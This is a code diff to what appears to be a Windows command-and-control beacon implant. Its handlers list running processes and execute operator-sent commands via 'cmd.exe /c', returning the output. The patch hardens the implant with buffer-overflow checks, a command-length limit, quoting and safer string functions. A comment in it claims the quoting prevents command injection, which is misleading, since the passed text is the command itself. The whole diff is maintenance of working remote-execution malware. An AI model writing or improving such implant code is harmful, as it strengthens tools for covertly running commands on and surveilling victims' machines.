@@ -43,7 +43,11 @@ static BEACON_ERROR collect_process_info(char** json_data, size_t* offset, size_
         do {
             // 检查缓冲区大小，如果剩余空间小于2KB则扩展缓冲区
             if (*capacity - *offset < 2048) {
-                size_t new_capacity = *capacity * 2;
+                if (*capacity > (SIZE_MAX / 2)) {
+                    CloseHandle(hSnapshot);
+                    return BEACON_ERROR_MEMORY;
+                }
+                size_t new_capacity = *capacity + *capacity;
                 char* new_buffer = (char*)realloc(*json_data, new_capacity);
                 if (!new_buffer) {
                     CloseHandle(hSnapshot);
@@ -117,7 +121,7 @@ BEACON_ERROR handle_proclist_task(const char* task_data, BEACON_CONFIG* config) 
         return BEACON_ERROR_PARAMS;
     }
 
-    size_t capacity = 1024 * 1024;  // 初始容量1MB
+    size_t capacity = 1048576;  // 初始容量1MB
     char* json_data = (char*)malloc(capacity);
     if (!json_data) {
         return BEACON_ERROR_MEMORY;
@@ -239,9 +243,13 @@ BEACON_ERROR handle_execute_task(const char* task_data, BEACON_CONFIG* config) {
     si.hStdError = hWritePipe;
     si.dwFlags |= STARTF_USESTDHANDLES;
 
-    // 构造命令行
+    // 构造命令行 - 将命令用引号包裹防止命令注入
+    if (strnlen(task_data, 4090) >= 4090) {
+        CloseHandle(hReadPipe);
+        return BEACON_ERROR_PARAMS;
+    }
     char cmdLine[4096];
-    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c %s", task_data);
+    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c \"%s\"", task_data);
 
     // 创建进程
     BOOL success = CreateProcessA(
@@ -293,7 +301,7 @@ BEACON_ERROR handle_execute_task(const char* task_data, BEACON_CONFIG* config) {
     // 如果进程超时，终止进程
     if (waitResult == WAIT_TIMEOUT) {
         TerminateProcess(pi.hProcess, 1);
-        strncat(output_buffer, "\n[Command execution timeout after 60 seconds]", 65535 - totalBytes - 1);
+        strcat_s(output_buffer, 65536, "\n[Command execution timeout after 60 seconds]");
     }
 
     // 清理进程句柄
